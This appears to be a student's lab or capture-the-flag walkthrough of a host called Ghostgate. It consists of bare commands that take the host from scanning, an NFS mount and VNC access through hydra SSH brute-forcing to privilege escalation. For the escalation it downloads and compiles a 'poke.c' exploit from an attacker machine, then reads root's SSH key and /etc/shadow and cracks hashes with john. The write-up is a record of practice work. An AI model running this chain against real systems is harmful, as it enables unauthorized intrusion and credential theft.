# Ghostgate 192.168.2.150
## Andrea Zonnekus 18758119

sudo nmap -p- -sV -O -oN host 192.168.2.150 --script="default or safe"

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.001.png)

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.002.png)



gobuster dir -u http://192.168.2.150 -w /usr/share/dirb/wordlists/big.txt

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.003.png)

nikto -url <http://192.168.2.150>

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.004.png)

showmount -e 192.168.2.150

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.005.png)

sudo mount -t nfs 192.168.2.150:/mnt/tmp /mnt/tmp

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.006.png)

ls

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.007.png)

<http://192.168.2.150/~centurion/>

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.008.png)



cat xwlog

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.009.png)

vncviewer 192.168.2.150:5901

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.010.png)

(vnc)

little birdie told me the users

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.011.png)

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.150 -m ssh -e nsr

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.012.png)

ssh aetian@192.168.2.150 -o HostKeyAlgorithms=+ssh-dss

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.013.png)

nmap –interactive

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.014.png)



sudo nmap -Pn -sV -sU 192.168.2.150 -oN host\_udp –open

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.015.png)

cat /usr/lib/cron/run-crons

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.016.png)

la

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.017.png)

cat mcelog

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.018.png)

php -S 0.0.0.0:80

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.019.png)

uname -a

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.020.png)

wget <http://10.8.0.106/poke.c>

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.021.png)



gcc poke.c -o poke -pthread -lcrypt

./poke

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.022.png)

su firefart

ls

id

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.023.png)

cd /root/.ssh

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.024.png)

cat id\_rsa

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.025.png)

cat /etc/shadow

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.026.png)



cat /etc/passwd

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.027.png)

john passwd shadow

![](ghostgate_steps/Aspose.Words.d9d0798e-203e-4c6c-9d9d-71c2b0eff8e5.028.png)
